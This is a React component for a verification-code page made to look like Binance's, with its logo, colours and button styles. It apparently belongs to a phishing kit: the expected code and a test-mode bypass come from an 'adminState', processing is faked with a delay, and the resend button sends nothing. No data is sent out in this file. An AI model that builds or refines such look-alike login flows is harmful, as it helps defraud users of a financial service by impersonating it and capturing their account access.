import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';
import { LoadingBars } from '@/components/ui/custom/LoadingBars';

export default function Verification() {
  const navigate = useNavigate();
  const { adminState, showToast } = useApp();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(29);
  const [canResend, setCanResend] = useState(false);
  const [loginIdentifier, setLoginIdentifier] = useState('');
  const [shake, setShake] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const identifier = sessionStorage.getItem('loginIdentifier');
    if (!identifier) {
      navigate('/');
      return;
    }
    setLoginIdentifier(identifier);
  }, [navigate]);

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [timeLeft]);

  function maskEmail(email: string): string {
    if (!email) return '';
    if (email.includes('@')) {
      const [local, domain] = email.split('@');
      if (local.length <= 2) return email;
      const maskedLocal = local.charAt(0) + '***' + local.charAt(local.length - 1);
      return `${maskedLocal}@${domain}`;
    }
    if (email.length <= 6) return email;
    return email.slice(0, 2) + '***' + email.slice(-2);
  }

  function handleInput(index: number, value: string) {
    // Only allow numbers
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);

    // Move to next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    // Auto-submit if all digits entered
    if (index === 5 && value) {
      const fullCode = [...newCode.slice(0, 5), value].join('');
      if (fullCode.length === 6) {
        setTimeout(() => verifyCode(fullCode), 100);
      }
    }
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent) {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  }

  function handlePaste(e: React.ClipboardEvent) {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').slice(0, 6);
    if (!/^\d+$/.test(pasteData)) return;

    const newCode = [...code];
    pasteData.split('').forEach((char, i) => {
      if (i < 6) newCode[i] = char;
    });
    setCode(newCode);

    // Focus next empty input or last input
    const nextIndex = Math.min(pasteData.length, 5);
    inputRefs.current[nextIndex]?.focus();

    // Auto-submit if paste fills all 6 digits
    if (pasteData.length === 6) {
      setTimeout(() => verifyCode(pasteData), 100);
    }
  }

  async function verifyCode(fullCode?: string) {
    const codeToVerify = fullCode || code.join('');
    
    if (codeToVerify.length !== 6) {
      setShake(true);
      setTimeout(() => setShake(false), 500);
      return;
    }

    setIsLoading(true);

    // Simulate processing
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Check code (use test mode or actual code)
    if (!adminState.auth.testMode && codeToVerify !== adminState.auth.verificationCode) {
      setIsLoading(false);
      setShake(true);
      setTimeout(() => setShake(false), 500);
      showToast('Invalid verification code', 'error');
      // Clear inputs
      setCode(['', '', '', '', '', '']);
      inputRefs.current[0]?.focus();
      return;
    }

    setIsLoading(false);
    navigate('/loading');
  }

  function handleResend() {
    if (!canResend) return;
    
    setTimeLeft(60);
    setCanResend(false);
    setCode(['', '', '', '', '', '']);
    inputRefs.current[0]?.focus();
    showToast('Verification code resent', 'success');
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#1D252B]">
      <div className="flex-1 flex flex-col px-6 pt-8 pb-6 max-w-md mx-auto w-full">
        {/* Logo */}
        <div className="mb-8">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        <div className="w-full text-left">
          <h1 className="text-[32px] font-bold mb-3 text-white tracking-tight">Verification Code</h1>
          <p className="text-[#848e9c] text-sm mb-8">
            Enter the 6-digit code sent to <span className="text-[#b7bdc6]">{maskEmail(loginIdentifier)}</span>
          </p>

          {/* OTP Inputs */}
          <div className={`flex justify-between gap-2 mb-6 ${shake ? 'animate-shake' : ''}`}>
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="text"
                maxLength={1}
                inputMode="numeric"
                pattern="[0-9]*"
                value={digit}
                onChange={(e) => handleInput(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="otp-input w-[14%] aspect-square"
              />
            ))}
          </div>

          {/* Continue Button */}
          <button
            onClick={() => verifyCode()}
            disabled={isLoading}
            className="binance-btn h-12 md:h-11 lg:h-11 text-base"
          >
            {isLoading ? (
              <LoadingBars color="#1E2329" size="sm" />
            ) : (
              'Continue'
            )}
          </button>

          {/* Resend Timer */}
          <div className="mt-6 text-center">
            <button
              onClick={handleResend}
              disabled={!canResend}
              className={`text-sm font-medium transition-colors ${
                canResend
                  ? 'text-[#F0B90B] hover:text-[#F8D33A] cursor-pointer'
                  : 'text-[#5e6673] cursor-default'
              }`}
            >
              {canResend ? 'Resend code' : `Resend code in ${timeLeft}s`}
            </button>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full py-6 text-center">
        <div className="flex justify-center items-center space-x-8 text-[#5e6673] text-sm">
          <button className="flex items-center hover:text-[#b7bdc6] transition-colors font-medium">
            <svg className="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
            </svg>
            English
          </button>
          <button className="hover:text-[#b7bdc6] transition-colors font-medium">Cookies</button>
          <button className="hover:text-[#b7bdc6] transition-colors font-medium">Privacy</button>
        </div>
      </footer>
    </div>
  );
}
